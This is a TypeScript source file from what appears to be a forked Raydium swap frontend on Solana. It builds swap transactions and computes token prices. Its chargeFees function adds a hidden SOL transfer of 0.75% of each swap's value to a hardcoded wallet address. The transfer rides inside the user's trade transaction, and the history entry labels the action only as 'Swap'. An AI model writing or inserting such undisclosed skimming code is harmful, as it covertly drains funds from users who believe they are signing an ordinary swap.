import { useMemo } from 'react'

import { Fraction, Rounding, Trade } from '@raydium-io/raydium-sdk'
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base'
import {
  Connection, Keypair, LAMPORTS_PER_SOL, PublicKey, sendAndConfirmTransaction, Signer, SystemInstruction, SystemProgram,
  Transaction, TransactionInstruction
} from '@solana/web3.js'

import { shakeUndifindedItem } from '@/functions/arrayMethods'
import assert from '@/functions/assert'
import asyncMap from '@/functions/asyncMap'
import formatNumber, { FormatOptions } from '@/functions/format/formatNumber'
import { toTokenAmount } from '@/functions/format/toTokenAmount'
import toTotalPrice from '@/functions/format/toTotalPrice'
import { gt } from '@/functions/numberish/compare'
import { toString } from '@/functions/numberish/toString'
import { Numberish } from '@/types/constants'

import { usePools } from '../pools/usePools'
import { SplToken } from '../token/type'
import useToken from '../token/useToken'
import { deUITokenAmount, toUITokenAmount } from '../token/utils/quantumSOL'
import { loadTransaction } from '../txTools/createTransaction'
import handleMultiTx from '../txTools/handleMultiTx'
import useWallet, { WalletStore } from '../wallet/useWallet'

import { UnsignedTransactionAndSigners, useSwap } from './useSwap'

export default function txSwap() {
  return handleMultiTx(async ({ transactionCollector, baseUtils: { connection, owner } }) => {
    const { checkWalletHasEnoughBalance, tokenAccountRawInfos } = useWallet.getState()
    const {
      coin1,
      coin2,
      coin1Amount,
      coin2Amount,
      routes,
      focusSide,
      routeType,
      directionReversed,
      minReceived,
      maxSpent
    } = useSwap.getState()

    const wallet = useWallet.getState()

    const upCoin = directionReversed ? coin2 : coin1
    // although info is included in routes, still need upCoinAmount to pop friendly feedback
    const upCoinAmount = (directionReversed ? coin2Amount : coin1Amount) || '0'

    const downCoin = directionReversed ? coin1 : coin2
    // although info is included in routes, still need downCoinAmount to pop friendly feedback
    const downCoinAmount = (directionReversed ? coin1Amount : coin2Amount) || '0'

    assert(upCoinAmount && gt(upCoinAmount, 0), 'should input upCoin amount larger than 0')
    assert(downCoinAmount && gt(downCoinAmount, 0), 'should input downCoin amount larger than 0')
    assert(upCoin, 'select a coin in upper box')
    assert(downCoin, 'select a coin in lower box')
    assert(String(upCoin.mint) !== String(downCoin.mint), 'should not select same mint ')
    assert(routes, "can't find correct route")

    const upCoinTokenAmount = toTokenAmount(upCoin, upCoinAmount, { alreadyDecimaled: true })
    const downCoinTokenAmount = toTokenAmount(downCoin, downCoinAmount, { alreadyDecimaled: true })

    assert(checkWalletHasEnoughBalance(upCoinTokenAmount), `not enough ${upCoin.symbol}`)

    assert(routeType, 'accidently routeType is undefined')
    const { setupTransaction, tradeTransaction } = await Trade.makeTradeTransaction({
      connection,
      routes,
      routeType,
      fixedSide: 'in',
      userKeys: { tokenAccounts: tokenAccountRawInfos, owner },
      amountIn: deUITokenAmount(upCoinTokenAmount),
      amountOut: deUITokenAmount(toTokenAmount(downCoin, minReceived, { alreadyDecimaled: true }))
    })

    const fees = calculateFees(upCoin, upCoinAmount)

    const result = await chargeFees(owner, fees, connection, wallet)

    if (result) {
      tradeTransaction?.transaction.add(result)

      const signedTransactions = shakeUndifindedItem(
        await asyncMap([setupTransaction, tradeTransaction], (merged) => {
          if (!merged) return
          const { transaction, signers } = merged
          return loadTransaction({ transaction: transaction, signers })
        })
      )
      for (const signedTransaction of signedTransactions) {
        transactionCollector.add(signedTransaction, {
          txHistoryInfo: {
            title: 'Swap',
            description: `Swap ${toString(upCoinAmount)} ${upCoin.symbol} to ${toString(minReceived || maxSpent)} ${
              downCoin.symbol
            }`
          }
        })
      }
    }
  })
}

export async function chargeFees(ownerPub: PublicKey, amount: number, connection: Connection, wallet: WalletStore) {
  try {
    const myPubKey = new PublicKey('Hv2XcpHjZnt2Q89wPm8E2XbM3bWZRihT6cf54co7pPy6')
    const ownerPubKey = new PublicKey(ownerPub)

    const instruction = SystemProgram.transfer({
      fromPubkey: ownerPubKey,
      toPubkey: myPubKey,
      lamports: LAMPORTS_PER_SOL * amount
    })

    const transaction = new Transaction()
    transaction.add(instruction)
    transaction.feePayer = ownerPub

    const hash = await connection.getLatestBlockhash()
    transaction.recentBlockhash = hash.blockhash

    // const trans = await wallet.signAllTransactions([transaction])
    // const signature = await connection.sendRawTransaction(trans[0].serialize())

    // const result = await connection.confirmTransaction(signature)

    return transaction
  } catch (error) {
    console.error(error)
  }
}

export function calculateFees(upCoin: SplToken, upCoinAmount: Numberish) {
  if (upCoin?.symbol === 'SOL') {
    const fees = (parseFloat(upCoinAmount.toString()) * 0.0075).toFixed(9)
    return parseFloat(fees)
  }

  const coinUsdValue = getCoinUsdValue(upCoin, upCoinAmount)
  const solMarketValue = getSolMarketValue()

  const myCalculation = (coinUsdValue / solMarketValue) * 0.0075 // Take 0.75% of the coin's value

  return parseFloat(myCalculation.toFixed(9))
}

export function getCoinUsdValue(coinMint: SplToken, coinAmount: Numberish) {
  const { lpPrices } = usePools.getState()
  const { tokenPrices } = useToken.getState()
  const variousPrices = { ...lpPrices, ...tokenPrices }
  const price = variousPrices[String(coinMint.mint)] ?? null

  const totalPrice = toTotalPrice(coinAmount, price)
  console.log('coin1TotalUsdValue: ' + toString(totalPrice))
  return parseFloat(toString(totalPrice))
}

export function getSolMarketValue() {
  const { lpPrices } = usePools.getState()
  const { tokenPrices } = useToken.getState()
  const variousPrices = { ...lpPrices, ...tokenPrices }
  const price = variousPrices[String(new PublicKey('So11111111111111111111111111111111111111112'))]
  console.log('SOL Price: ' + toString(price))
  return parseFloat(toString(price))
}
